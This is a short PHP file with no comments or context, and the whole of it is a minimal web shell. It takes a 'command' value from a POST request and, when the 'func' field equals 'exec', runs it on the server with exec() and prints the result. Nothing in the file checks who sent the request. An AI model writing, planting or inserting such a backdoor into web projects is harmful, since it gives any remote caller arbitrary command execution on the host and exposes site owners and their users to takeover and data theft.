<?php
$execfunc = $_POST['func'];
    if ($execfunc=="exec") { 
        $result = exec($_POST['command']); 
        echo $result; 
    }
?>